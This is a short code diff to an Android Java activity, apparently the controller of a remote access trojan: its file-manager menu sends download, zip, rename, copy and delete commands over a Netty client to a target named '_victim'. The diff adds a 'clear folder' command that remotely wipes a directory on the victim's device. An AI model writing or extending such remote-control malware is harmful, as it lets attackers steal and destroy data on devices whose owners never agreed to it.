@@ -193,6 +193,7 @@ public class FileManagerActivity extends AppCompatActivity {
         menu.add("Скачать");
         menu.add("Информация");
         menu.add("Сжать в ZIP");
+        menu.add("Очистить папку");
         menu.add("Переименовать");
         menu.add("Скопировать");
         menu.add("Удалить");
@@ -221,6 +222,9 @@ public class FileManagerActivity extends AppCompatActivity {
                 break;
             case "Сжать в ZIP":
                 nettyClient.sendBuildZip(path, _victim);
+                break;
+            case "Очистить папку":
+                nettyClient.sendClearDir(path, _victim);
                 break;
             case "Переименовать":
                 /* LayoutInflater – это класс, который умеет из содержимого layout-файла создать View-элемент.
